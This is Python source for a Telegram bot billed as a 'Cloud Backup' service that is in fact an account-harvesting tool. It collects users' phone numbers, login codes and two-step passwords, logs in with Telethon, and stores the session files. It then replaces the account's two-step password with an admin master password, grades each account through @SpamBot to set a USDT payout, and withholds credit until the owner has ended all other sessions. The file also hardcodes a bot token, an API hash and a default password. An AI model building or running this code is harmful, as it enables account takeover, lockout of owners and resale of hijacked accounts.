import os
import asyncio
import json
import shutil
import zipfile
import sys
from datetime import datetime
from threading import Thread
from flask import Flask, render_template_string
import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tl_types
from telethon.errors import SessionPasswordNeededError

# ==================== কোর এডমিন কনফিগারেশন ====================
API_ID = 36547444
API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
BOT_TOKEN = "8970655570:AAGb0C4KmwkOzUxHNA29O6SHfJ2omqrUMJ4"
ADMIN_ID = 8095751648
# =========================================================

BASE_STORAGE_DIR = "user_backups"
DB_FILE = "user_database.json"
SETTINGS_FILE = "bot_settings.json"

if not os.path.exists(BASE_STORAGE_DIR):
    try: os.makedirs(BASE_STORAGE_DIR, exist_ok=True)
    except: pass

FLAG_MAP = {
    "880": "🇧🇩", "52": "🇲🇽", "60": "🇲🇾", "49": "🇩🇪", "54": "🇦🇷", "57": "🇨🇴", "1": "🇺🇸", "44": "🇬🇧", "91": "🇮🇳"
}
def get_flag(code):
    return FLAG_MAP.get(str(code), "🏳️")

DEFAULT_SETTINGS = {
    "security_password": "MySecureBotPassword123",
    "country_config": {
        "880": {"free": 0.15, "spam": 0.10, "perm": 0.05, "new": 0.12, "cap": 100, "delay": 600},
        "52": {"free": 0.51, "spam": 0.35, "perm": 0.20, "new": 0.40, "cap": 500, "delay": 600},
        "60": {"free": 0.47, "spam": 0.30, "perm": 0.15, "new": 0.35, "cap": 100, "delay": 600}
    }
}

# ==================== ডাটাবেস কন্ট্রোলার ====================
def load_settings():
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, "r") as f:
                loaded = json.load(f)
                if "country_config" not in loaded: loaded["country_config"] = DEFAULT_SETTINGS["country_config"]
                return loaded
        except: return DEFAULT_SETTINGS
    return DEFAULT_SETTINGS

def save_settings(settings):
    try:
        with open(SETTINGS_FILE, "w") as f: json.dump(settings, f, indent=4)
    except: pass

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(db):
    try:
        with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)
    except: pass

def is_number_locked(phone_number):
    db = load_db()
    if "verified_numbers" not in db: db["verified_numbers"] = []
    if "pending_numbers" not in db: db["pending_numbers"] = []
    return (phone_number in db["verified_numbers"]) or (phone_number in db["pending_numbers"])

def add_to_pending_numbers(phone_number):
    db = load_db()
    if "pending_numbers" not in db: db["pending_numbers"] = []
    if phone_number not in db["pending_numbers"]: db["pending_numbers"].append(phone_number)
    save_db(db)

def remove_from_pending_numbers(phone_number):
    db = load_db()
    if "pending_numbers" in db and phone_number in db["pending_numbers"]:
        db["pending_numbers"].remove(phone_number)
    save_db(db)

def add_to_verified_numbers(phone_number):
    db = load_db()
    if "verified_numbers" not in db: db["verified_numbers"] = []
    if phone_number not in db["verified_numbers"]: db["verified_numbers"].append(phone_number)
    if "pending_numbers" in db and phone_number in db["pending_numbers"]:
        db["pending_numbers"].remove(phone_number)
    save_db(db)

def get_user_stats(user_id):
    db = load_db()
    uid = str(user_id)
    if uid not in db:
        db[uid] = {"verified": 0, "unverified": 0, "pending_balance": 0.0, "verified_balance": 0.0}
        save_db(db)
    return db[uid]

def add_user_pending_account(user_id, amount):
    db = load_db()
    uid = str(user_id)
    if uid not in db: get_user_stats(user_id); db = load_db()
    db[uid]["unverified"] += 1
    db[uid]["pending_balance"] = round(db[uid]["pending_balance"] + amount, 2)
    save_db(db)

def convert_pending_to_verified(user_id, amount):
    db = load_db()
    uid = str(user_id)
    if uid in db:
        if db[uid]["unverified"] > 0: db[uid]["unverified"] -= 1
        db[uid]["verified"] += 1
        db[uid]["pending_balance"] = max(0.0, round(db[uid]["pending_balance"] - amount, 2))
        db[uid]["verified_balance"] = round(db[uid]["verified_balance"] + amount, 2)
        save_db(db)

def reject_pending_account(user_id, amount):
    db = load_db()
    uid = str(user_id)
    if uid in db:
        if db[uid]["unverified"] > 0: db[uid]["unverified"] -= 1
        db[uid]["pending_balance"] = max(0.0, round(db[uid]["pending_balance"] - amount, 2))
        save_db(db)

def get_current_file_count(country_code):
    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(target_dir): return 0
    try: return len([f for f in os.listdir(target_dir) if f.endswith(".session")])
    except: return 0

# ==================== FLASK SERVER ====================
app = Flask("UptimeServer")
@app.route('/')
def home():
    settings = load_settings()
    total_sessions = 0
    country_list_html = ""
    for code, conf in settings["country_config"].items():
        count = get_current_file_count(code)
        total_sessions += count
        country_list_html += f"<tr><td><b>{get_flag(code)} +{code}</b></td><td>{count} / {conf['cap']}</td><td>${conf['free']}</td></tr>"
    return render_template_string(f"<html><body style='font-family:sans-serif;background:#0f172a;color:#fff;text-align:center;'><h2>● SERVER RUNNING</h2><h1>Total Sessions: {total_sessions}</h1><table style='margin:auto;text-align:left;'>{country_list_html}</table></body></html>")

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

# ==================== BOT CORE ====================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
user_data = {}
admin_state = {}
live_trackers = {}

bot_loop = asyncio.new_event_loop()
def start_async_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()
Thread(target=start_async_loop, args=(bot_loop,), daemon=True).start()

def check_valid_country_and_get_code(phone_number):
    clean = phone_number.replace("+", "").replace(" ", "")
    settings = load_settings()
    sorted_codes = sorted(settings["country_config"].keys(), key=len, reverse=True)
    for code in sorted_codes:
        if clean.startswith(code): return code
    return None

@bot.message_handler(commands=['start'])
def cmd_start(message):
    bot.send_message(message.chat.id, "👋 **Welcome to Cloud Backup Telegram Bot**\n\nSend phone number with country code.\nExample: `+88017XXXXXXXX`")

@bot.message_handler(commands=['cancel'])
def cmd_cancel(message):
    user_id = message.from_user.id
    if user_id in user_data:
        try: asyncio.run_coroutine_threadsafe(user_data[user_id]["client"].disconnect(), bot_loop)
        except: pass
        del user_data[user_id]
    bot.send_message(message.chat.id, "❌ **Cancelled.**")

@bot.message_handler(commands=['capacity'])
def cmd_capacity(message):
    settings = load_settings()
    response = f"👍 **Available Countries : ({len(settings['country_config'])})**:\n\n"
    for code, conf in settings["country_config"].items():
        response += f"{get_flag(code)} **+{code}**\nFree:${conf['free']}|New:${conf['new']}|Spam:${conf['spam']}|Perm:${conf['perm']}|{conf['cap']}|{conf['delay']}s\n\n"
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['account'])
def cmd_account(message):
    user_id = message.from_user.id
    stats = get_user_stats(user_id)
    response = (
        f"👤 **ID : {user_id}**\n\n"
        f"✅ Verified accounts : {stats['verified']}\n"
        f"⏳ Unverified accounts : {stats['unverified']}\n"
        f"🅈 Verified Balance : {stats['verified_balance']:.2f} USDT\n"
        f"⏳ Pending Balance : {stats['pending_balance']:.2f} USDT\n\n/withdraw"
    )
    bot.send_message(message.chat.id, response)

@bot.callback_query_handler(func=lambda call: call.data.startswith("chk_time_"))
def handle_live_timer_click(call):
    tracker_id = call.data.replace("chk_time_", "")
    if tracker_id not in live_trackers:
        bot.answer_callback_query(call.id, "⚠️ Session Expired or Processed!")
        return
        
    tracker = live_trackers[tracker_id]
    elapsed = int((datetime.now() - tracker["start_time"]).total_seconds())
    remaining = max(0, tracker["total_delay"] - elapsed)
    
    if remaining <= 0:
        bot.answer_callback_query(call.id, "🎉 Processing confirmation...")
        return
        
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(f"✅ Account Verification {remaining}s", callback_data=f"chk_time_{tracker_id}"))
    try:
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup)
        bot.answer_callback_query(call.id, f"⏳ {remaining} seconds remaining")
    except:
        bot.answer_callback_query(call.id, f"⏳ {remaining}s remaining")

@bot.message_handler(commands=['panel'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID: return
    settings = load_settings()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🌍 Set Country Config", callback_data="pnl_set_country"), types.InlineKeyboardButton("🔐 Change Admin 2FA Password", callback_data="pnl_set_2fa"))
    
    msg = "🛠 *Master Admin Panel*\n\n"
    for c, conf in settings["country_config"].items():
        msg += f"• {get_flag(c)} `+{c}` ➜ Free: ${conf['free']} | Spam: ${conf['spam']} | New: ${conf['new']} | Cap: {conf['cap']}\n"
    bot.send_message(message.chat.id, msg, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("pnl_"))
def handle_pnl(call):
    if call.from_user.id != ADMIN_ID: return
    if call.data == "pnl_set_country":
        bot.send_message(call.message.chat.id, "🌍 *Format:*\n`Code=FreePrice=SpamPrice=PermPrice=NewPrice=Capacity=Delay` ")
        admin_state[call.from_user.id] = "wait_country_all"
    elif call.data == "pnl_set_2fa":
        bot.send_message(call.message.chat.id, "🔐 *Enter new master password for accounts protection:*")
        admin_state[call.from_user.id] = "wait_admin_2fa"

# ==================== টেক্সট ইনপুট হ্যান্ডলিং ====================
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    if user_id in admin_state:
        state = admin_state[user_id]
        if user_id == ADMIN_ID and state == "wait_country_all":
            del admin_state[user_id]
            try:
                p = text.split("=")
                settings = load_settings()
                settings["country_config"][p[0].strip()] = {
                    "free": float(p[1]), "spam": float(p[2]), "perm": float(p[3]), "new": float(p[4]), "cap": int(p[5]), "delay": int(p[6])
                }
                save_settings(settings)
                bot.reply_to(message, "✅ Country configurations updated!")
            except: bot.reply_to(message, "❌ Invalid Format Setup.")
            return
        elif user_id == ADMIN_ID and state == "wait_admin_2fa":
            del admin_state[user_id]
            settings = load_settings()
            settings["security_password"] = text
            save_settings(settings)
            bot.reply_to(message, f"✅ Master 2FA Password updated to: `{text}`")
            return

    if user_id in user_data and ("phone_code_hash" in user_data[user_id] or user_data[user_id].get("waiting_for_password")):
        asyncio.run_coroutine_threadsafe(verify_otp_task(text, user_id, message), bot_loop)
        return

    if text.startswith("+") or text.isdigit():
        phone = text if text.startswith("+") else f"+{text}"
        clean_phone = phone.replace("+", "").replace(" ", "")
        
        if is_number_locked(clean_phone):
            bot.reply_to(message, f"❌ The account number `{phone}` is already verified or currently in confirmation process.")
            return
            
        matched_code = check_valid_country_and_get_code(phone)
        if not matched_code:
            bot.reply_to(message, "❗ You cannot add account from this country.")
            return
            
        flag = get_flag(matched_code)
        processing_msg = bot.reply_to(message, f"🔄 Processing {flag} please wait...")
        asyncio.run_coroutine_threadsafe(send_otp_task(phone, matched_code, user_id, message, processing_msg, flag), bot_loop)
    else:
        bot.reply_to(message, "❌ Invalid Format. Use /start")

# ==================== ASYNC TELETHON ENGINE ====================
async def send_otp_task(phone_number, country_code, user_id, message, processing_msg, flag):
    settings = load_settings()
    conf = settings["country_config"][country_code]
    if get_current_file_count(country_code) >= conf["cap"]:
        bot.edit_message_text(f"❌ Capacity Over!", message.chat.id, processing_msg.message_id)
        return
    
    clean_phone = phone_number.replace("+", "").replace(" ", "")
    final_session_path = os.path.join(BASE_STORAGE_DIR, country_code, f"+{clean_phone}")
    os.makedirs(os.path.dirname(final_session_path), exist_ok=True)
    
    user_client = TelegramClient(final_session_path, API_ID, API_HASH, base_logger='critical')
    try:
        await user_client.connect()
        sent_code = await user_client.send_code_request(phone_number)
        user_data[user_id] = {
            "client": user_client, "phone": phone_number, "phone_code_hash": sent_code.phone_code_hash,
            "clean_phone": clean_phone, "session_path": final_session_path, "country_code": country_code,
            "prompt_msg_id": processing_msg.message_id, "flag": flag
        }
        bot.edit_message_text(f"🔢 Enter the code sent to the number:\n\n{flag} ( `{phone_number}` )\n\n🦤 /cancel", message.chat.id, processing_msg.message_id)
    except Exception as e: 
        bot.edit_message_text(f"❌ Connection Error: {e}", message.chat.id, processing_msg.message_id)
        try: await user_client.disconnect()
        except: pass

async def verify_otp_task(text, user_id, message):
    data = user_data[user_id]
    settings = load_settings()
    client = data["client"]
    
    try:
        if not client.is_connected():
            await client.connect()
    except:
        bot.reply_to(message, "❌ Session disconnected. Please try again.")
        del user_data[user_id]
        return

    if data.get("waiting_for_password"):
        try:
            current_pwd = text
            await client.sign_in(password=current_pwd)
            
            # ইনস্ট্যান্ট মাস্টার লক প্রোটেকশন অ্যাসাইনমেন্ট
            try:
                await client(functions.account.UpdatePasswordSettingsRequest(
                    password=await client.get_password_setting() if hasattr(client, 'get_password_setting') else tl_types.InputCheckPasswordEmpty(),
                    new_settings=tl_types.PasswordInputSettings(new_password=settings["security_password"], hint="Cloud Lock Master")
                ))
            except:
                try: await client(functions.account.UpdatePasswordSettingsRequest(password=current_pwd, new_settings=tl_types.PasswordInputSettings(new_password=settings["security_password"])))
                except: pass
                
            await check_and_save_account(user_id, message, data, settings)
        except Exception as e: 
            bot.reply_to(message, f"❌ Password Error: {e}. Ensure you enter correct 2FA password.")
    else:
        try:
            await client.sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
            try:
                await client(functions.account.UpdatePasswordSettingsRequest(
                    password=tl_types.InputCheckPasswordEmpty(),
                    new_settings=tl_types.PasswordInputSettings(new_password=settings["security_password"], hint="Cloud Lock Master")
                ))
            except: pass
            
            await check_and_save_account(user_id, message, data, settings)
        except SessionPasswordNeededError:
            bot.reply_to(message, "🔐 Two-step verification active. Enter Password:")
            user_data[user_id]["waiting_for_password"] = True
        except Exception as e: 
            bot.reply_to(message, f"❌ OTP Code Error: {e}")

async def check_and_save_account(user_id, message, data, settings):
    add_to_pending_numbers(data["clean_phone"])
    
    spam_status = "🕊️ Free As Bird"
    price_key = "free"
    
    # ==================== [বিদ্যুতের গতিতে স্প্যামবট চেক লজিক] ====================
    try:
        # সরাসরি মেসেজ পাঠিয়ে ইনকামিং মেসেজ লুপ থেকে ইনস্ট্যান্ট ১ সেকেন্ডে ডাটা রিড করা হবে
        await data["client"].send_message('@SpamBot', '/start')
        await asyncio.sleep(1.2) # মেসেজ ডেলিভারি ও রেসপন্সের নিখুঁত ফাস্ট টাইমার
        async for msg in data["client"].iter_messages('@SpamBot', limit=1):
            bot_text = msg.text.lower()
            if "good news" in bot_text or "no limits" in bot_text:
                spam_status = "🕊️ Free As Bird"
                price_key = "free"
            elif "unfortunate" in bot_text or "temporary" in bot_text:
                spam_status = "⚠️ Spam"
                price_key = "spam"
            else:
                spam_status = "🛑 Permanent Spam"
                price_key = "perm"
                break
    except:
        spam_status = "🆕 New Registration"
        price_key = "new"

    conf = settings["country_config"][data['country_code']]
    target_price = conf[price_key]
    
    if target_price <= 0:
        bot.reply_to(message, f"❌ Sorry, `{spam_status}` accounts are temporarily disabled by Admin.")
        remove_from_pending_numbers(data["clean_phone"])
        await data["client"].disconnect()
        del user_data[user_id]
        return

    # ওল্ড ওটিপি ইন্টারফেস ডিলিট (ক্লিন লুক)
    try: bot.delete_message(message.chat.id, data["prompt_msg_id"])
    except: pass

    add_user_pending_account(user_id, target_price)
    
    tracker_id = str(user_id) + "_" + str(int(datetime.now().timestamp()))
    live_trackers[tracker_id] = {"start_time": datetime.now(), "total_delay": conf["delay"]}
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(f"✅ Account Verification {conf['delay']}s", callback_data=f"chk_time_{tracker_id}"))
    
    v_msg = bot.send_message(message.chat.id, f"✅ The account number `{data['phone']}` was successfully received\n\n❗ You have to wait {conf['delay']} seconds time to confirm the account, please log out\n\n👇 The bot will automatically verify your account\n\n🏷️ Spam Status : {spam_status}", reply_markup=markup)
    
    await data["client"].disconnect()
    del user_data[user_id]
    
    asyncio.create_task(run_background_verification(user_id, data, conf, target_price, v_msg.message_id, tracker_id))

async def run_background_verification(user_id, data, conf, target_price, msg_id, tracker_id):
    await asyncio.sleep(conf["delay"])
    
    max_wait = 1800
    interval = 30
    elapsed = 0
    
    while elapsed <= max_wait:
        try:
            await data["client"].connect()
            if not await data["client"].is_user_authorized():
                reject_pending_account(user_id, target_price)
                remove_from_pending_numbers(data["clean_phone"])
                if tracker_id in live_trackers: del live_trackers[tracker_id]
                try: bot.delete_message(user_id, msg_id)
                except: pass
                return
                
            auths = await data["client"](functions.account.GetAuthorizationsRequest())
            if len([a for a in auths.authorizations if not a.current]) == 0:
                await data["client"].disconnect()
                try: bot.delete_message(user_id, msg_id)
                except: pass
                
                convert_pending_to_verified(user_id, target_price)
                add_to_verified_numbers(data["clean_phone"])
                bot.send_message(user_id, f"🎉 **Account {data['phone']} confirmed successfully!** Your balance has been updated.")
                bot.send_message(ADMIN_ID, f"🔔 **New Secure Session Backed Up:** `{data['phone']}`")
                if tracker_id in live_trackers: del live_trackers[tracker_id]
                return
            else:
                if elapsed == 0:
                    bot.send_message(user_id, f"⚠️ **Device Detected on `{data['phone']}`!**\n\nGo to Telegram Settings > Devices and Terminate all other sessions immediately to confirm verification.")
            await data["client"].disconnect()
        except: pass
        await asyncio.sleep(interval)
        elapsed += interval

    reject_pending_account(user_id, target_price)
    remove_from_pending_numbers(data["clean_phone"])
    if tracker_id in live_trackers: del live_trackers[tracker_id]
    try: bot.delete_message(user_id, msg_id)
    except: pass
    bot.send_message(user_id, f"❌ **Verification Timed Out!** Other active devices were not removed for `{data['phone']}`.")

if __name__ == "__main__":
    Thread(target=run_flask, daemon=True).start()
    bot.infinity_polling(skip_pending=True)
